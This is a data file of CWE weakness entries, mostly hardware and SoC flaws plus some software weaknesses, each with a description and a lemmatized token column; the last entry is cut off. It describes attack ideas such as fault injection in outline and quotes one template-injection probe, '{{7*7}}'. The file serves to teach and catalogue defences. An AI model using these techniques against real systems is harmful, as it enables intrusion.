CWE-1313,Hardware Allows Activation of Test or Debug Logic at Runtime,"During runtime, the hardware allows for test or debug logic (feature) to be activated, which allows for changing the state of the hardware. This feature can alter the intended behavior of the system and allow for alteration and leakage of sensitive data by an adversary.An adversary can take advantage of test or debug logic that is made accessible through the hardware during normal operation to modify the intended behavior of the system. For example, an accessible Test/debug mode may allow read/write access to any system data. Using error injection (a common test/debug feature) during a transmit/receive operation on a bus, data may be modified to produce an unintended message. Similarly, confidentiality could be compromised by such features allowing access to secrets.",runtime hardware allow test debug logic feature activate allow change state hardware feature alter intended behavior system allow alteration leakage sensitive datum adversary adversary advantage test debug logic accessible hardware normal operation modify intended behavior system example accessible test debug mode allow read write access system datum error injection common test debug feature transmit receive operation bus datum modify produce unintended message similarly confidentiality compromise feature allow access secret
CWE-1314,Missing Write Protection for Parametric Data Values,"The device does not write-protect the parametric data values for sensors that scale the sensor value, allowing untrusted software to manipulate the apparent result and potentially damage hardware or cause operational failure.Various sensors are used by hardware to detect any devices operating outside of the design limits. The threshold limit values are set by hardware fuses or trusted software such as the BIOS. These limits may be related to thermal, power, voltage, current, and frequency. Hardware mechanisms may be used to protect against alteration of the threshold limit values by untrusted software.The limit values are generally programmed in standard units for the type of value being read. However, the hardware-sensor blocks may report the settings in different units depending upon sensor design and operation. The raw sensor output value is converted to the desired units using a scale conversion based on the parametric data programmed into the sensor. The final converted value is then compared with the previously programmed limits.While the limit values are usually protected, the sensor parametric data values may not be. By changing the parametric data, safe operational limits may be bypassed.",device write protect parametric data value sensor scale sensor value allow untrusted software manipulate apparent result potentially damage hardware cause operational failure sensor hardware detect device operate outside design limit threshold limit value set hardware fuse trust software bios limit relate thermal power voltage current frequency hardware mechanism protect alteration threshold limit value untrusted software limit value generally program standard unit type value read hardware sensor block report setting different unit depend sensor design operation raw sensor output value convert desire unit scale conversion base parametric datum program sensor final convert value compare previously program limit limit value usually protect sensor parametric datum value change parametric datum safe operational limit bypass
CWE-1315,Improper Setting of Bus Controlling Capability in Fabric End-point,"The bus controller enables bits in the fabric end-point to allow responder devices to control transactions on the fabric.To support reusability, certain fabric interfaces and end points provide a configurable register bit that allows IP blocks connected to the controller to access other peripherals connected to the fabric. This allows the end point to be used with devices that function as a controller or responder. If this bit is set by default in hardware, or if firmware incorrectly sets it later, a device intended to be a responder on a fabric is now capable of controlling transactions to other devices and might compromise system security.",bus controller enable bit fabric end point allow responder device control transaction fabric support reusability certain fabric interface end point provide configurable register bit allow ip block connect controller access peripheral connect fabric allow end point device function controller responder bit set default hardware firmware incorrectly set later device intend responder fabric capable control transaction device compromise system security
CWE-1316,Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges,"The address map of the on-chip fabric has protected and unprotected regions overlapping, allowing an attacker to bypass access control to the overlapping portion of the protected region.Various ranges can be defined in the system-address map, either in the memory or in Memory-Mapped-IO (MMIO) space. These ranges are usually defined using special range registers that contain information, such as base address and size. Address decoding is the process of determining for which range the incoming transaction is destined. To ensure isolation, ranges containing secret data are access-control protected.Occasionally, these ranges could overlap. The overlap could either be intentional (e.g. due to a limited number of range registers or limited choice in choosing size of the range) or unintentional (e.g. introduced by errors). Some hardware designs allow dynamic remapping of address ranges assigned to peripheral MMIO ranges. In such designs, intentional address overlaps can be created through misconfiguration by malicious software. When protected and unprotected ranges overlap, an attacker could send a transaction and potentially compromise the protections in place, violating the principle of least privilege.",address map chip fabric protect unprotected region overlap allow attacker bypass access control overlap portion protect region range define system address map memory memory mapped io mmio space range usually define special range register contain information base address size address decoding process determine range incoming transaction destine ensure isolation range contain secret datum access control protect occasionally range overlap overlap intentional limited number range register limited choice choose size range unintentional introduce error hardware design allow dynamic remapping address range assign peripheral mmio range design intentional address overlap create misconfiguration malicious software protected unprotected range overlap attacker send transaction potentially compromise protection place violate principle privilege
CWE-1317,Improper Access Control in Fabric Bridge,"The product uses a fabric bridge for transactions between two Intellectual Property (IP) blocks, but the bridge does not properly perform the expected privilege, identity, or other access control checks between those IP blocks.In hardware designs, different IP blocks are connected through interconnect-bus fabrics (e.g. AHB and OCP). Within a System on Chip (SoC), the IP block subsystems could be using different bus protocols. In such a case, the IP blocks are then linked to the central bus (and to other IP blocks) through a fabric bridge. Bridges are used as bus-interconnect-routing modules that link different protocols or separate, different segments of the overall SoC interconnect.For overall system security, it is important that the access-control privileges associated with any fabric transaction are consistently maintained and applied, even when they are routed or translated by a fabric bridge. A bridge that is connected to a fabric without security features forwards transactions to the slave without checking the privilege level of the master and results in a weakness in SoC access-control security. The same weakness occurs if a bridge does not check the hardware identity of the transaction received from the slave interface of the bridge.",product use fabric bridge transaction intellectual property ip block bridge properly perform expect privilege identity access control check ip block hardware design different ip block connect interconnect bus fabric ahb ocp system chip soc ip block subsystem different bus protocol case ip block link central bus ip block fabric bridge bridge bus interconnect route module link different protocol separate different segment overall soc interconnect overall system security important access control privilege associate fabric transaction consistently maintain apply route translate fabric bridge bridge connect fabric security feature forward transaction slave check privilege level master result weakness soc access control security weakness occur bridge check hardware identity transaction receive slave interface bridge
CWE-1318,Missing Support for Security Features in On-chip Fabrics or Buses,"On-chip fabrics or buses either do not support or are not configured to support privilege separation or other security features, such as access control.Certain on-chip fabrics and buses, especially simple and low-power buses, do not support security features. Apart from data transfer and addressing ports, some fabrics and buses do not have any interfaces to transfer privilege, immutable identity, or any other security attribute coming from the bus master. Similarly, they do not have dedicated signals to transport security-sensitive data from slave to master, such as completions for certain types of transactions. Few other on-chip fabrics and buses support security features and define specific interfaces/signals for transporting security attributes from master to slave or vice-versa. However, including these signals is not mandatory and could be left unconfigured when generating the register-transfer-level (RTL) description for the fabric. Such fabrics or buses should not be used to transport any security attribute coming from the bus master. In general, peripherals with security assets should not be connected to such buses before the transaction from the bus master reaches the bus, unless some form of access control is performed at a fabric bridge or another intermediate module.",chip fabric bus support configure support privilege separation security feature access control certain chip fabric bus especially simple low power bus support security feature apart datum transfer address port fabric bus interface transfer privilege immutable identity security attribute come bus master similarly dedicate signal transport security sensitive datum slave master completion certain type transaction chip fabric bus support security feature define specific interface signal transport security attribute master slave vice versa include signal mandatory leave unconfigured generate register transfer level rtl description fabric fabric bus transport security attribute come bus master general peripheral security asset connect bus transaction bus master reach bus form access control perform fabric bridge intermediate module
CWE-1319,Improper Protection against Electromagnetic Fault Injection (EM-FI),"The device is susceptible to electromagnetic fault injection attacks, causing device internal information to be compromised or security mechanisms to be bypassed.Electromagnetic fault injection may allow an attacker to locally and dynamically modify the signals (both internal and external) of an integrated circuit. EM-FI attacks consist of producing a local, transient magnetic field near the device, inducing current in the device wires. A typical EMFI setup is made up of a pulse injection circuit that generates a high current transient in an EMI coil, producing an abrupt magnetic pulse which couples to the target producing faults in the device, which can lead to:Bypassing security mechanisms such as secure JTAG or Secure BootLeaking device informationModifying program flowPerturbing secure hardware modules (e.g. random number generators)",device susceptible electromagnetic fault injection attack cause device internal information compromise security mechanism bypass electromagnetic fault injection allow attacker locally dynamically modify signal internal external integrate circuit em fi attack consist produce local transient magnetic field near device induce current device wire typical emfi setup pulse injection circuit generate high current transient emi coil produce abrupt magnetic pulse couple target produce fault device lead bypass security mechanism secure jtag secure bootleaking device informationmodifye program flowperturbe secure hardware module random number generator
CWE-132,DEPRECATED: Miscalculated Null Termination,This entry has been deprecated because it was a duplicate of CWE-170. All content has been transferred to CWE-170.,entry deprecate duplicate content transfer
CWE-1320,Improper Protection for Outbound Error Messages and Alert Signals,"Untrusted agents can disable alerts about signal conditions exceeding limits or the response mechanism that handles such alerts.Hardware sensors are used to detect whether a device is operating within design limits. The threshold values for these limits are set by hardware fuses or trusted software such as a BIOS. Modification of these limits may be protected by hardware mechanisms.When device sensors detect out of bound conditions, alert signals may be generated for remedial action, which may take the form of device shutdown or throttling.Warning signals that are not properly secured may be disabled or used to generate spurious alerts, causing degraded performance or denial-of-service (DoS). These alerts may be masked by untrusted software. Examples of these alerts involve thermal and power sensor alerts.",untrusted agent disable alert signal condition exceed limit response mechanism handle alert hardware sensor detect device operate design limit threshold value limit set hardware fuse trust software bios modification limit protect hardware mechanism device sensor detect bind condition alert signal generate remedial action form device shutdown throttling warning signal properly secure disable generate spurious alert cause degraded performance denial service dos alert mask untrusted software example alert involve thermal power sensor alert
CWE-1321,Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'),"The product receives input from an upstream component that specifies attributes that are to be initialized or updated in an object, but it does not properly control modifications of attributes of the object prototype.By adding or modifying attributes of an object prototype, it is possible to create attributes that exist on every object, or replace critical attributes with malicious ones. This can be problematic if the product depends on existence or non-existence of certain attributes, or uses pre-defined attributes of object prototype (such as hasOwnProperty, toString or valueOf).This weakness is usually exploited by using a special attribute of objects called proto, constructor or prototype. Such attributes give access to the object prototype. This weakness is often found in code that assigns object attributes based on user input, or merges or clones objects recursively.",product receive input upstream component specify attribute initialize update object properly control modification attribute object prototype add modify attribute object prototype possible create attribute exist object replace critical attribute malicious one problematic product depend existence non existence certain attribute use pre defined attribute object prototype hasownproperty tostring weakness usually exploit special attribute object call proto constructor prototype attribute access object prototype weakness find code assign object attribute base user input merge clone object recursively
CWE-1322,"Use of Blocking Code in Single-threaded, Non-blocking Context","The product uses a non-blocking model that relies on a single threaded process for features such as scalability, but it contains code that can block when it is invoked.When an attacker can directly invoke the blocking code, or the blocking code can be affected by environmental conditions that can be influenced by an attacker, then this can lead to a denial of service by causing unexpected hang or freeze of the code. Examples of blocking code might be an expensive computation or calling blocking library calls, such as those that perform exclusive file operations or require a successful network operation.Due to limitations in multi-thread models, single-threaded models are used to overcome the resource constraints that are caused by using many threads. In such a model, all code should generally be non-blocking. If blocking code is called, then the event loop will effectively be stopped, which can be undesirable or dangerous. Such models are used in Python asyncio, Vert.x, and Node.js, or other custom event loop code.",product use non blocking model rely single threaded process feature scalability contain code block invoke attacker directly invoke block code block code affect environmental condition influence attacker lead denial service cause unexpected hang freeze code example block code expensive computation call block library call perform exclusive file operation require successful network operation limitation multi thread model single threaded model overcome resource constraint cause thread model code generally non blocking block code call event loop effectively stop undesirable dangerous model python asyncio custom event loop code
CWE-1323,Improper Management of Sensitive Trace Data,"Trace data collected from several sources on the System-on-Chip (SoC) is stored in unprotected locations or transported to untrusted agents.To facilitate verification of complex System-on-Chip (SoC) designs, SoC integrators add specific IP blocks that trace the SoC's internal signals in real-time. This infrastructure enables observability of the SoC's internal behavior, validation of its functional design, and detection of hardware and software bugs. Such tracing IP blocks collect traces from several sources on the SoC including the CPU, crypto coprocessors, and on-chip fabrics. Traces collected from these sources are then aggregated inside trace IP block and forwarded to trace sinks, such as debug-trace ports that facilitate debugging by external hardware and software debuggers.Since these traces are collected from several security-sensitive sources, they must be protected against untrusted debuggers. If they are stored in unprotected memory, an untrusted software debugger can access these traces and extract secret information. Additionally, if security-sensitive traces are not tagged as secure, an untrusted hardware debugger might access them to extract confidential information.",trace datum collect source system chip soc store unprotected location transport untrusted agent facilitate verification complex system chip soc design soc integrator add specific ip block trace soc internal signal real time infrastructure enable observability soc internal behavior validation functional design detection hardware software bug tracing ip block collect trace source soc include cpu crypto coprocessor chip fabric trace collect source aggregate inside trace ip block forward trace sink debug trace port facilitate debugging external hardware software debugger trace collect security sensitive source protect untrusted debugger store unprotected memory untrusted software debugger access trace extract secret information additionally security sensitive trace tag secure untrusted hardware debugger access extract confidential information
CWE-1324,DEPRECATED: Sensitive Information Accessible by Physical Probing of JTAG Interface,This entry has been deprecated because it was at a lower level of abstraction than supported by CWE. All relevant content has been integrated into CWE-319.,entry deprecate low level abstraction support cwe relevant content integrate
CWE-1325,Improperly Controlled Sequential Memory Allocation,"The product manages a group of objects or resources and performs a separate memory allocation for each object, but it does not properly limit the total amount of memory that is consumed by all of the combined objects.While the product might limit the amount of memory that is allocated in a single operation for a single object (such as a malloc of an array), if an attacker can cause multiple objects to be allocated in separate operations, then this might cause higher total memory consumption than the developer intended, leading to a denial of service.",product manage group object resource perform separate memory allocation object properly limit total memory consume combine object product limit memory allocate single operation single object malloc array attacker cause multiple object allocate separate operation cause high total memory consumption developer intend lead denial service
CWE-1326,Missing Immutable Root of Trust in Hardware,"A missing immutable root of trust in the hardware results in the ability to bypass secure boot or execute untrusted or adversarial boot code.A System-on-Chip (SoC) implements secure boot by verifying or authenticating signed boot code. The signing of the code is achieved by an entity that the SoC trusts. Before executing the boot code, the SoC verifies that the code or the public key with which the code has been signed has not been tampered with. The other data upon which the SoC depends are system-hardware settings in fuses such as whether ""Secure Boot is enabled"". These data play a crucial role in establishing a Root of Trust (RoT) to execute secure-boot flows.One of the many ways RoT is achieved is by storing the code and data in memory or fuses. This memory should be immutable, i.e., once the RoT is programmed/provisioned in memory, that memory should be locked and prevented from further programming or writes. If the memory contents (i.e., RoT) are mutable, then an adversary can modify the RoT to execute their choice of code, resulting in a compromised secure boot.Note that, for components like ROM, secure patching/update features should be supported to allow authenticated and authorized updates in the field.",miss immutable root trust hardware result ability bypass secure boot execute untrusted adversarial boot code system chip soc implement secure boot verify authenticate sign boot code signing code achieve entity soc trust execute boot code soc verify code public key code sign tamper datum soc depend system hardware setting fuse secure boot enable datum play crucial role establish root trust rot execute secure boot flow way rot achieve store code datum memory fuse memory immutable rot program provision memory memory lock prevent programming write memory content rot mutable adversary modify rot execute choice code result compromise secure boot note component like rom secure patching update feature support allow authenticated authorized update field
CWE-1327,Binding to an Unrestricted IP Address,"The product assigns the address 0.0.0.0 for a database server, a cloud service/instance, or any computing resource that communicates remotely.When a server binds to the address 0.0.0.0, it allows connections from every IP address on the local machine, effectively exposing the server to every possible network. This might be much broader access than intended by the developer or administrator, who might only be expecting the server to be reachable from a single interface/network.",product assign address database server cloud service instance compute resource communicate remotely server bind address allow connection ip address local machine effectively expose server possible network broad access intend developer administrator expect server reachable single interface network
CWE-1328,Security Version Number Mutable to Older Versions,"Security-version number in hardware is mutable, resulting in the ability to downgrade (roll-back) the boot firmware to vulnerable code versions.A System-on-Chip (SoC) implements secure boot or verified boot. It might support a security version number, which prevents downgrading the current firmware to a vulnerable version. Once downgraded to a previous version, an adversary can launch exploits on the SoC and thus compromise the security of the SoC. These downgrade attacks are also referred to as roll-back attacks.The security version number must be stored securely and persistently across power-on resets. A common weakness is that the security version number is modifiable by an adversary, allowing roll-back or downgrade attacks or, under certain circumstances, preventing upgrades (i.e. Denial-of-Service on upgrades). In both cases, the SoC is in a vulnerable state.",security version number hardware mutable result ability downgrade roll boot firmware vulnerable code version system chip soc implement secure boot verify boot support security version number prevent downgrade current firmware vulnerable version downgrade previous version adversary launch exploit soc compromise security downgrade attack refer roll attack security version number store securely persistently power reset common weakness security version number modifiable adversary allow roll downgrade attack certain circumstance prevent upgrade denial service upgrade case soc vulnerable state
CWE-1329,Reliance on Component That is Not Updateable,"The product contains a component that cannot be updated or patched in order to remove vulnerabilities or significant bugs.If the component is discovered to contain a vulnerability or critical bug, but the issue cannot be fixed using an update or patch, then the product's owner will not be able to protect against the issue. The only option might be replacement of the product, which could be too financially or operationally expensive for the product owner. As a result, the inability to patch or update can leave the product open to attacker exploitation or critical operation failures. This weakness can be especially difficult to manage when using ROM, firmware, or similar components that traditionally have had limited or no update capabilities. In industries such as healthcare, ""legacy"" devices can be operated for decades. As a US task force report [REF-1197] notes, ""the inability to update or replace equipment has both large and small health care delivery organizations struggle with numerous unsupported legacy systems that cannot easily be replaced (hardware, software, and operating systems) with large numbers of vulnerabilities and few modern countermeasures."" While hardware can be prone to this weakness, software systems can also be affected, such as when a third-party driver or library is no longer actively maintained or supported but is still critical for the required functionality.",product contain component update patch order remove vulnerability significant bug component discover contain vulnerability critical bug issue fix update patch product owner able protect issue option replacement product financially operationally expensive product owner result inability patch update leave product open attacker exploitation critical operation failure weakness especially difficult manage rom firmware similar component traditionally limited update capability industry healthcare legacy device operate decade task force report note inability update replace equipment large small health care delivery organization struggle numerous unsupported legacy system easily replace hardware software operating system large number vulnerability modern countermeasure hardware prone weakness software system affect party driver library long actively maintain support critical require functionality
CWE-1330,Remanent Data Readable after Memory Erase,"Confidential information stored in memory circuits is readable or recoverable after being cleared or erased.Data remanence occurs when stored, memory content is not fully lost after a memory-clear or -erase operation. Confidential memory contents can still be readable through data remanence in the hardware.Data remanence can occur because of performance optimization or memory organization during 'clear' or 'erase' operations, like a design that allows the memory-organization metadata (e.g., file pointers) to be erased without erasing the actual memory content. To protect against this weakness, memory devices will often support different commands for optimized memory erase and explicit secure erase.Data remanence can also happen because of the physical properties of memory circuits in use. For example, static, random-access-memory (SRAM) and dynamic, random-access-memory (DRAM) data retention is based on the charge retained in the memory cell, which depends on factors such as power supply, refresh rates, and temperature.Other than explicit erase commands, self-encrypting, secure-memory devices can also support secure erase through cryptographic erase commands. In such designs, only the decryption keys for encrypted data stored on the device are erased. That is, the stored data are always remnant in the media after a cryptographic erase. However, only the encrypted data can be extracted. Thus, protection against data recovery in such designs relies on the strength of the encryption algorithm.",confidential information store memory circuit readable recoverable clear erase data remanence occur store memory content fully lose memory clear operation confidential memory content readable datum remanence hardware data remanence occur performance optimization memory organization clear erase operation like design allow memory organization metadata file pointer erase erase actual memory content protect weakness memory device support different command optimize memory erase explicit secure erase data remanence happen physical property memory circuit use example static random access memory sram dynamic random access memory dram datum retention base charge retain memory cell depend factor power supply refresh rate temperature explicit erase command self encrypt secure memory device support secure erase cryptographic erase command design decryption key encrypt datum store device erase store datum remnant medium cryptographic erase encrypt datum extract protection datum recovery design rely strength encryption algorithm
CWE-1331,Improper Isolation of Shared Resources in Network On Chip (NoC),"The Network On Chip (NoC) does not isolate or incorrectly isolates its on-chip-fabric and internal resources such that they are shared between trusted and untrusted agents, creating timing channels.Typically, network on chips (NoC) have many internal resources that are shared between packets from different trust domains. These resources include internal buffers, crossbars and switches, individual ports, and channels. The sharing of resources causes contention and introduces interference between differently trusted domains, which poses a security threat via a timing channel, allowing attackers to infer data that belongs to a trusted agent. This may also result in introducing network interference, resulting in degraded throughput and latency.",network chip noc isolate incorrectly isolate chip fabric internal resource share trusted untrusted agent create timing channel typically network chip noc internal resource share packet different trust domain resource include internal buffer crossbar switch individual port channel sharing resource cause contention introduce interference differently trust domain pose security threat timing channel allow attacker infer datum belong trust agent result introduce network interference result degrade throughput latency
CWE-1332,Improper Handling of Faults that Lead to Instruction Skips,"The device is missing or incorrectly implements circuitry or sensors that detect and mitigate the skipping of security-critical CPU instructions when they occur.The operating conditions of hardware may change in ways that cause unexpected behavior to occur, including the skipping of security-critical CPU instructions. Generally, this can occur due to electrical disturbances or when the device operates outside of its expected conditions.In practice, application code may contain conditional branches that are security-sensitive (e.g., accepting or rejecting a user-provided password). These conditional branches are typically implemented by a single conditional branch instruction in the program binary which, if skipped, may lead to effectively flipping the branch condition - i.e., causing the wrong security-sensitive branch to be taken. This affects processes such as firmware authentication, password verification, and other security-sensitive decision points.Attackers can use fault injection techniques to alter the operating conditions of hardware so that security-critical instructions are skipped more frequently or more reliably than they would in a ""natural"" setting.",device miss incorrectly implement circuitry sensor detect mitigate skipping security critical cpu instruction occur operating condition hardware change way cause unexpected behavior occur include skipping security critical cpu instruction generally occur electrical disturbance device operate outside expect condition practice application code contain conditional branch security sensitive accept reject user provide password conditional branch typically implement single conditional branch instruction program binary skip lead effectively flip branch condition cause wrong security sensitive branch take affect process firmware authentication password verification security sensitive decision point attacker use fault injection technique alter operating condition hardware security critical instruction skip frequently reliably natural setting
CWE-1333,Inefficient Regular Expression Complexity,"The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles.Some regular expression engines have a feature called ""backtracking"". If the token cannot match, the engine ""backtracks"" to a position that may result in a different token that can match. Backtracking becomes a weakness if all of these conditions are met:The number of possible backtracking attempts are exponential relative to the length of the input.The input can fail to match the regular expression.The input can be long enough. Attackers can create crafted inputs that intentionally cause the regular expression to use excessive backtracking in a way that causes the CPU consumption to spike.",product use regular expression inefficient possibly exponential bad case computational complexity consume excessive cpu cycle regular expression engine feature call backtracking token match engine backtrack position result different token match backtracking weakness condition meet number possible backtracking attempt exponential relative length input input fail match regular expression input long attacker create craft input intentionally cause regular expression use excessive backtracking way cause cpu consumption spike
CWE-1334,Unauthorized Error Injection Can Degrade Hardware Redundancy,"An unauthorized agent can inject errors into a redundant block to deprive the system of redundancy or put the system in a degraded operating mode.To ensure the performance and functional reliability of certain components, hardware designers can implement hardware blocks for redundancy in the case that others fail. This redundant block can be prevented from performing as intended if the design allows unauthorized agents to inject errors into it. In this way, a path with injected errors may become unavailable to serve as a redundant channel. This may put the system into a degraded mode of operation which could be exploited by a subsequent attack.",unauthorized agent inject error redundant block deprive system redundancy system degraded operating mode ensure performance functional reliability certain component hardware designer implement hardware block redundancy case fail redundant block prevent perform intend design allow unauthorized agent inject error way path inject error unavailable serve redundant channel system degraded mode operation exploit subsequent attack
CWE-1335,Incorrect Bitwise Shift of Integer,"An integer value is specified to be shifted by a negative amount or an amount greater than or equal to the number of bits contained in the value causing an unexpected or indeterminate result.Specifying a value to be shifted by a negative amount is undefined in various languages. Various computer architectures implement this action in different ways. The compilers and interpreters when generating code to accomplish a shift generally do not do a check for this issue.Specifying an over-shift, a shift greater than or equal to the number of bits contained in a value to be shifted, produces a result which varies by architecture and compiler. In some languages, this action is specifically listed as producing an undefined result.",integer value specify shift negative great equal number bit contain value cause unexpected indeterminate result specify value shift negative undefined language computer architecture implement action different way compiler interpreter generate code accomplish shift generally check issue specify shift shift great equal number bit contain value shift produce result vary architecture compiler language action specifically list produce undefined result
CWE-1336,Improper Neutralization of Special Elements Used in a Template Engine,"The product uses a template engine to insert or process externally-influenced input, but it does not neutralize or incorrectly neutralizes special elements or syntax that can be interpreted as template expressions or other code directives when processed by the engine.Many web applications use template engines that allow developers to insert externally-influenced values into free text or messages in order to generate a full web page, document, message, etc. Such engines include Twig, Jinja2, Pug, Java Server Pages, FreeMarker, Velocity, ColdFusion, Smarty, and many others - including PHP itself. Some CMS (Content Management Systems) also use templates.Template engines often have their own custom command or expression language. If an attacker can influence input into a template before it is processed, then the attacker can invoke arbitrary expressions, i.e. perform injection attacks. For example, in some template languages, an attacker could inject the expression ""{{7*7}}"" and determine if the output returns ""49"" instead. The syntax varies depending on the language.In some cases, XSS-style attacks can work, which can obscure the root cause if the developer does not closely investigate the root cause of the error.Template engines can be used on the server or client, so both ""sides"" could be affected by injection. The mechanisms of attack or the affected technologies might be different, but the mistake is fundamentally the same.",product use template engine insert process externally influence input neutralize incorrectly neutralize special element syntax interpret template expression code directive process engine web application use template engine allow developer insert externally influenced value free text message order generate web page document message etc engine include twig pug java server pages freemarker velocity coldfusion smarty include php cms content management systems use template template engine custom command expression language attacker influence input template process attacker invoke arbitrary expression perform injection attack example template language attacker inject expression determine output return instead syntax vary depend language case xss style attack work obscure root cause developer closely investigate root cause error template engine server client side affect injection mechanism attack affected technology different mistake fundamentally
CWE-1338,Improper Protections Against Hardware Overheating,"A hardware device is missing or has inadequate protection features to prevent overheating.Hardware, electrical circuits, and semiconductor silicon have thermal side effects, such that some of the energy consumed by the device gets dissipated as heat and increases the temperature of the device. For example, in semiconductors, higher-operating frequency of silicon results in higher power dissipation and heat. The leakage current in CMOS circuits increases with temperature, and this creates positive feedback that can result in thermal runaway and damage the device permanently.Any device lacking protections such as thermal sensors, adequate platform cooling, or thermal insulation is susceptible to attacks by malicious software that might deliberately operate the device in modes that result in overheating. This can be used as an effective denial of service (DoS) or permanent denial of service (PDoS) attack.Depending on the type of hardware device and its expected usage, such thermal overheating can also cause safety hazards and reliability issues. Note that battery failures can also cause device overheating but the mitigations and examples included in this submission cannot reliably protect against a battery failure. There can be similar weaknesses with lack of protection from attacks based on overvoltage or overcurrent conditions. However, thermal heat is generated by hardware operation and the device should implement protection from overheating.",hardware device miss inadequate protection feature prevent overheating hardware electrical circuit semiconductor silicon thermal effect energy consume device gets dissipate heat increase temperature device example semiconductor higher operate frequency silicon result high power dissipation heat leakage current cmos circuit increase temperature create positive feedback result thermal runaway damage device permanently device lack protection thermal sensor adequate platform cooling thermal insulation susceptible attack malicious software deliberately operate device mode result overheat effective denial service dos permanent denial service pdos attack depend type hardware device expect usage thermal overheating cause safety hazard reliability issue note battery failure cause device overheating mitigation example include submission reliably protect battery failure similar weakness lack protection attack base overvoltage overcurrent condition thermal heat generate hardware operation device implement protection overheating
CWE-1339,Insufficient Precision or Accuracy of a Real Number,"The product processes a real number with an implementation in which the number's representation does not preserve required accuracy and precision in its fractional part, causing an incorrect result.When a security decision or calculation requires highly precise, accurate numbers such as financial calculations or prices, then small variations in the number could be exploited by an attacker. There are multiple ways to store the fractional part of a real number in a computer. In all of these cases, there is a limit to the accuracy of recording a fraction. If the fraction can be represented in a fixed number of digits (binary or decimal), there might not be enough digits assigned to represent the number. In other cases the number cannot be represented in a fixed number of digits due to repeating in decimal or binary notation (e.g. 0.333333...) or due to a transcendental number such as Π or √2. Rounding of numbers can lead to situations where the computer results do not adequately match the result of sufficiently accurate math.",product process real number implementation number representation preserve require accuracy precision fractional cause incorrect result security decision calculation require highly precise accurate number financial calculation price small variation number exploit attacker multiple way store fractional real number computer case limit accuracy record fraction fraction represent fix number digit binary decimal digit assign represent number case number represent fix number digit repeat decimal binary notation transcendental number π rounding number lead situation computer result adequately match result sufficiently accurate math
CWE-134,Use of Externally-Controlled Format String,"The product uses a function that accepts a format string as an argument, but the format string originates from an external source.When an attacker can modify an externally-controlled format string, this can lead to buffer overflows, denial of service, or data representation problems.It should be noted that in some circumstances, such as internationalization, the set of format strings is externally controlled by design. If the source of these format strings is trusted (e.g. only contained in library files that are only modifiable by the system administrator), then the external control might not itself pose a vulnerability.",product use function accept format string argument format string originate external source attacker modify externally control format string lead buffer overflow denial service datum representation problem note circumstance internationalization set format string externally control design source format string trust contain library file modifiable system administrator external control pose vulnerability
CWE-1341,Multiple Releases of Same Resource or Handle,"The product attempts to close or release a resource or handle more than once, without any successful open between the close operations.Code typically requires ""opening"" handles or references to resources such as memory, files, devices, socket connections, services, etc. When the code is finished with using the resource, it is typically expected to ""close"" or ""release"" the resource, which indicates to the environment (such as the OS) that the resource can be re-assigned or reused by unrelated processes or actors - or in some cases, within the same process. API functions or other abstractions are often used to perform this release, such as free() or delete() within C/C++, or file-handle close() operations that are used in many languages.Unfortunately, the implementation or design of such APIs might expect the developer to be responsible for ensuring that such APIs are only called once per release of the resource. If the developer attempts to release the same resource/handle more than once, then the API's expectations are not met, resulting in undefined and/or insecure behavior. This could lead to consequences such as memory corruption, data corruption, execution path corruption, or other consequences.Note that while the implementation for most (if not all) resource reservation allocations involve a unique identifier/pointer/symbolic reference, then if this identifier is reused, checking the identifier for resource closure may result in a false state of openness and closing of the wrong resource. For this reason, reuse of identifiers is discouraged.",product attempt close release resource handle successful open close operation code typically require open handle reference resource memory file device socket connection service etc code finish resource typically expect close release resource indicate environment os resource assign reuse unrelated process actor case process api function abstraction perform release free delete c file handle close operation language unfortunately implementation design api expect developer responsible ensure api call release resource developer attempt release resource handle api expectation meet result undefined insecure behavior lead consequence memory corruption datum corruption execution path corruption consequence note implementation resource reservation allocation involve unique identifier pointer symbolic reference identifier reuse check identifier resource closure result false state openness closing wrong resource reason reuse identifier discourage
CWE-1342,Information Exposure through Microarchitectural State after Transient Execution,"The processor does not properly clear microarchitectural state after incorrect microcode assists or speculative execution, resulting in transient execution.In many processor architectures an exception, mis-speculation, or microcode assist results in a flush operation to clear results that are no longer required. This action prevents these results from influencing architectural state that is intended to be visible from software. However, traces of this transient execution may remain in microarchitectural buffers, resulting in a change in microarchitectural state that can expose sensitive information to an attacker using side-channel analysis. For example, Load Value Injection (LVI) [REF-1202] can exploit direct injection of erroneous values into intermediate load and store buffers.Several conditions may need to be fulfilled for a successful attack:1) incorrect transient execution that results in remanence of sensitive information;2) attacker has the ability to provoke microarchitectural exceptions;3) operations and structures in victim code that can be exploited must be identified.",processor properly clear microarchitectural state incorrect microcode assist speculative execution result transient execution processor architecture exception mis speculation microcode assist result flush operation clear result long require action prevent result influence architectural state intend visible software trace transient execution remain microarchitectural buffer result change microarchitectural state expose sensitive information attacker channel analysis example load value injection lvi exploit direct injection erroneous value intermediate load store buffer condition need fulfil successful incorrect transient execution result remanence sensitive attacker ability provoke microarchitectural operation structure victim code exploit identify
CWE-135,Incorrect Calculation of Multi-Byte String Length,The product does not correctly calculate the length of strings that can contain wide or multi-byte characters.,product correctly calculate length string contain wide multi byte character
CWE-1351,Improper Handling of Hardware Behavior in Exceptionally Cold Environments,"A hardware device, or the firmware running on it, is missing or has incorrect protection features to maintain goals of security primitives when the device is cooled below standard operating temperatures.The hardware designer may improperly anticipate hardware behavior when exposed to exceptionally cold conditions. As a result they may introduce a weakness by not accounting for the modified behavior of critical components when in extreme environments.An example of a change in behavior is that power loss won't clear/reset any volatile state when cooled below standard operating temperatures. This may result in a weakness when the starting state of the volatile memory is being relied upon for a security decision. For example, a Physical Unclonable Function (PUF) may be supplied as a security primitive to improve confidentiality, authenticity, and integrity guarantees. However, when the PUF is paired with DRAM, SRAM, or another temperature sensitive entropy source, the system designer may introduce weakness by failing to account for the chosen entropy source's behavior at exceptionally low temperatures. In the case of DRAM and SRAM, when power is cycled at low temperatures, the device will not contain the bitwise biasing caused by inconsistencies in manufacturing and will instead contain the data from previous boot. Should the PUF primitive be used in a cryptographic construction which does not account for full adversary control of PUF seed data, weakness would arise.This weakness does not cover ""Cold Boot Attacks"" wherein RAM or other external storage is super cooled and read externally by an attacker.",hardware device firmware run miss incorrect protection feature maintain goal security primitive device cool standard operating temperature hardware designer improperly anticipate hardware behavior expose exceptionally cold condition result introduce weakness account modify behavior critical component extreme environment example change behavior power loss will clear reset volatile state cool standard operating temperature result weakness start state volatile memory rely security decision example physical unclonable function puf supply security primitive improve confidentiality authenticity integrity guarantee 